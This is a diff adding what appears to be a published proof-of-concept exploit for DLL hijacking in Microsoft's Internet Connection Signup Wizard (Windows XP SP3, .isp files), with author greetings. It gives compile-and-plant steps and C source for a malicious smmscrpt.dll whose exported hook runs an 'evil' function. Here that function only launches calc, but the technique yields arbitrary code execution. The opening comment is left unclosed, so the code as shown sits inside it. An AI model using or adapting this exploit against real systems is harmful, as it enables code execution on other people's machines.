@@ -1,0 +1,26 @@
+# Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles , Dinesh Arora
+# Site : www.BeenuArora.com
+
+/* 
+Exploit Title: Microsoft Internet Connection Signup Wizard DLL Hijacking
+Date: 25/08/2010
+Author: Beenu Arora
+Tested on: Windows XP SP3 
+Vulnerable extensions: .isp
+
+Compile and rename to smmscrpt.dll, create a file in the same dir with one of the following extensions:
+.isp
+
+
+#include <windows.h>
+#define DLLIMPORT __declspec (dllexport)
+
+DLLIMPORT void hook_startup() { evil(); }
+
+int evil()
+{
+  WinExec("calc", 0);
+  exit(0);
+  return 0;
+}
+
